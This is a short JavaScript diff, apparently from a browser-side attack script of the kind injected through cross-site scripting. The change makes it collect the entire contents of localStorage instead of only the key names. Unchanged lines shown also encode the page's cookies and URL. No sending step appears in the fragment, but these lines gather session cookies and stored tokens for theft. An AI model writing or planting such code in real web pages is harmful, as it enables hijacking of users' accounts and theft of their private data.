@@ -1,6 +1,6 @@
 
 
-locall =  encodeURI(JSON.stringify(Object.keys(localStorage)))
+locall =  encodeURI(JSON.stringify(localStorage))
 cookies = encodeURI(document.cookie)
 urll = encodeURI(location.href)
 
